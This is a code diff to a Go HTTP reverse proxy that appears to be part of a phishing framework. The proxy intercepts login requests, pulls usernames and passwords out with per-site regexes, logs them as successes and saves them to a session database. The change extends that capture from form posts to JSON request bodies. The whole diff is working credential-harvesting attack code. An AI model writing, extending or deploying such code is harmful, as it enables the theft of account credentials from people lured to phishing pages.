@@ -222,34 +222,66 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-						if req.ParseForm() == nil {
-							for k, v := range req.Form {
-								log.Debug("POST %s = %s", k, v[0])
-								if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
-									if re, err := regexp.Compile(pl.re_username); err == nil {
-										um := re.FindStringSubmatch(v[0])
-										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-												log.Error("database: %v", err)
+
+
+						contentType := req.Header.Get("Content-type")
+						if contentType == "application/json" {
+							
+							json, _ := ioutil.ReadAll(req.Body)
+							log.Debug("POST %s", json)
+
+							re := regexp.MustCompile(pl.re_username)
+							um := re.FindStringSubmatch(string(json))
+							if um != nil && len(um) > 1 {
+								p.setSessionUsername(ps.SessionId, um[1])
+								log.Success("[%d] Username: [%s]", ps.Index, um[1])
+								if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+									log.Error("database: %v", err)
+								}
+							}
+
+							re = regexp.MustCompile(pl.re_password)
+							pm := re.FindStringSubmatch(string(json))
+							if pm != nil && len(pm) > 1 {
+								p.setSessionPassword(ps.SessionId, pm[1])
+								log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+								if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+									log.Error("database: %v", err)
+								}
+							}
+
+						}else{
+
+							if req.ParseForm() == nil {
+								for k, v := range req.Form {
+									log.Debug("POST %s = %s", k, v[0])
+									if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
+										if re, err := regexp.Compile(pl.re_username); err == nil {
+											um := re.FindStringSubmatch(v[0])
+											if um != nil && len(um) > 1 {
+												p.setSessionUsername(ps.SessionId, um[1])
+												log.Success("[%d] Username: [%s]", ps.Index, um[1])
+												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
-								}
-								if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
-									if re, err := regexp.Compile(pl.re_password); err == nil {
-										pm := re.FindStringSubmatch(v[0])
-										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
+									if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
+										if re, err := regexp.Compile(pl.re_password); err == nil {
+											pm := re.FindStringSubmatch(v[0])
+											if pm != nil && len(pm) > 1 {
+												p.setSessionPassword(ps.SessionId, pm[1])
+												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
 								}
 							}
+
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
